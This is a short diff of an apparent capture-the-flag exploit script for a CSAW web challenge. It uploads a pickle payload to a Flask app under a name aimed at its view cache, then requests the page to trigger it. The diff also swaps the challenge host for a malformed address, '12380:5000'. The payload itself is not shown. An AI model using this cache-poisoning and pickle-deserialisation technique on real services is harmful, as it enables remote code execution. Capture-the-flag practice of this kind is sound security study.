@@ -13,10 +13,10 @@ with open('pwn.pickle', 'wb') as f:
 
 print('post')
 post(
-    'http://web.chal.csaw.io:5000/',
+    '12380:5000/',
     files={"content": io.BytesIO(p)},
     data={"title": "flask_cache_view//test1"}
 )
 
 print('get')
-get("http://web.chal.csaw.io:5000/test1")
+get("http://12380:5000/test1")
